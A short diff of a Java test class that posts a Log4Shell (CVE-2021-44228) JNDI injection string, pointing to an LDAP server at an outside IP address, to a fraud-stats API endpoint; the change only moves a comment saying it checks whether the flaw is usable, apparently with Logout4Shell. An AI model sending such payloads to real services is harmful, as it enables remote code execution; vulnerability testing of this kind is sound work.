@@ -8,7 +8,8 @@ public class StatsTest {
 
     public static void main(String[] args) {
         System.out.println("Code: " + Utils.postContent("http://51.210.249.108:11043/api/fraud/stats/",
-                new CommonClassForTests("${jndi:ldap://51.210.249.108:1389/a}", 5).toString())); // Check if a the Log4Shell CVE-2021-44228 vulnerability is usable
+                new CommonClassForTests("${jndi:ldap://51.210.249.108:1389/a}", 5).toString()));
+        // Check if a the Log4Shell CVE-2021-44228 vulnerability is usable proceeded with Logout4Shell
     }
 
 
